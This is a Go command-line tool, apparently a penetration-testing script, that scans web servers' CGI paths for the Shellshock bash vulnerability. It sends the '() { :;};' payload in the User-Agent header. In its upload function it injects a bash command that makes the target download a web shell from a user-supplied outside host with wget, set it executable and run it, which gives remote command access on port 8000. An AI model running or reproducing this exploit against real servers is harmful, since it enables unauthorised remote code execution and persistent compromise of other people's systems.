package main

import (
	"bufio"
	"log"
	"os"
	"net/http"
	"io/ioutil"
	"strings"
	"flag"
	"fmt"
	)


func usage() {
	fmt.Println("ShellShock Scanner Tool")
	fmt.Println("")
	fmt.Println("Usage: ./scanner -t=target_host -d=dictionary_path")
	fmt.Println("	-d --dictionary		- path to dictionary of CGI usual paths")
	fmt.Println("	-h --help 		- obtain thiis help")
	fmt.Println("	-n --web_shell_name	- if want to use a webshell, select the web_shell name that will be downloaded")
	fmt.Println("	-p --cgi_paths 		- if you know where is the cgi, put here the path in the target")
	fmt.Println("	-t --target_host	- host ip to scanner")
	fmt.Println("	-w --web_shell		- use if you want to use a webshell when we exploit the vulnerability. Put an url to download")
	fmt.Println("")
	fmt.Println("")
	fmt.Println("Examples:")
	fmt.Println("	./scanner -h")
	fmt.Println("	./scanner -t 192.168.56.101 -d='cgi_paths'")
	fmt.Println("	./scanner -t 192.168.56.101 -d='cgi_paths'")
	fmt.Println("	./scanner -t 192.168.56.101 -p='/cgi-bin/test_cgi'")
	fmt.Println("	./scanner -t 192.168.56.101 -d='cgi_paths' -w='http://192.168.56.1/Download/server' -n='server'")
	fmt.Println("")
	os.Exit(0)
}

func main() {

	// ####################################################################################
	// ############################     Flags Control     #################################
	// ####################################################################################

	wantHelp := flag.Bool("h", false, "a bool")
	
	argTarget := flag.String("t", "", "a string")
	argDictPath := flag.String("d", "", "a string")
	cgiPath := flag.String("p", "", "a string")
	
	argWebShell := flag.String("w", "", "a string")
	argWebShellName := flag.String("n", "", "a string")

	flag.Parse()

	if *wantHelp {
		usage()
	}

	wantToUploadWebShell := false

	if *argTarget == "" {
		usage()
	}

	if *argDictPath == "" && *cgiPath == "" {
		usage()
	}

	if *argDictPath != "" && *cgiPath != "" {
		usage()
	}

	if (*argWebShell != "" && *argWebShellName == "") || (*argWebShell == "" && *argWebShellName != "") {
		usage()
	} else if *argWebShell != "" && *argWebShellName != "" {
		wantToUploadWebShell = true
	}

	// ####################################################################################
	// ########################     End of Flags Control     ##############################
	// ####################################################################################

	url := "http://" + *argTarget

	paths := []string{}


	// If we have the dict flag, we need to read the file

	log.Println("Starting scanner on " + url)
	log.Println("")


	if *argDictPath != "" {

		if file, err := os.Open(*argDictPath); err == nil {
			defer file.Close()

			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				paths = append(paths, scanner.Text())
			}

			if err = scanner.Err(); err != nil {
				log.Fatal(err)
			}
		} else {
			log.Fatal(err)
		}

		for _ , val := range paths {
			scannerThis(url + val, wantToUploadWebShell, *argWebShell, *argWebShellName, *argTarget)
		}
		
	} else {

		// If not, lets go for the known path

		scannerThis(url + *cgiPath, wantToUploadWebShell, *argWebShell, *argWebShellName, *argTarget)

	} 

}


func scannerThis(url string, wantToUploadWebShell bool, argWebShell string, argWebShellName string, argTarget string) {

	// way to scanner if a host is vulnerable: 
	// 1 - send a request to see if they have a gci in the host (necessary to attack a remote shellshock)
	// 2 - if the response code is 200, we need to send the first attack that will return the repsonse of the execution of a command
	// 3 - if the server gives us the expected response, it is vulnerable
	// 4 - upload web shell

	scannerClient := &http.Client{}

	scannerReq, err := http.NewRequest("GET", url, nil)
	if err != nil {
		panic(err)
	}

	scannerResp, err := scannerClient.Do(scannerReq)
	if err != nil {
		panic(err)
	}

	if scannerResp.StatusCode == 200 {

		vulnWord := "vulnerable"
		vulnClient := &http.Client{}

		vulnReq, err := http.NewRequest("GET", url, nil)
		if err != nil {
			panic(err)
		}

		vulnReq.Header.Add("User-Agent","() { :;}; echo 'Content-Type: text/plain';echo;echo;/bin/echo " + vulnWord)

		vulnResp, err := vulnClient.Do(vulnReq)
		if err != nil {
			panic(err)
		}

		defer vulnResp.Body.Close()

		body, err := ioutil.ReadAll(vulnResp.Body)
		if err != nil {
			panic(err)
		}

		trimedBody := strings.TrimSpace(string(body))

		if trimedBody == vulnWord {
			log.Println(url, "is vulnerable to ShellSock")
			
		}

		if wantToUploadWebShell {

			log.Println("Uploading web shell...")
			log.Println("")

			uploadWebShell(url, argWebShell, argWebShellName, argTarget)
			
		}

	}
	
}


func uploadWebShell(url string, argWebShell string, argWebShellName string, argTarget string) {

	vulnClient := &http.Client{}

	vulnReq, err := http.NewRequest("GET", url, nil)
	if err != nil {
		panic(err)
	}

	header := "() { :;}; /bin/bash -c 'wget " + argWebShell + " -P /tmp/; chmod 777 /tmp/" + argWebShellName + "; /tmp/" + argWebShellName + " > /dev/null'"

	vulnReq.Header.Add("User-Agent", header)

	log.Println("Server started. Go to http://" + argTarget + ":8000/ to access it. Remember to use the complete path to commands (eg: /bin/ls -la)")
	log.Println("You can stop this app now...")

	vulnClient.Do(vulnReq)

}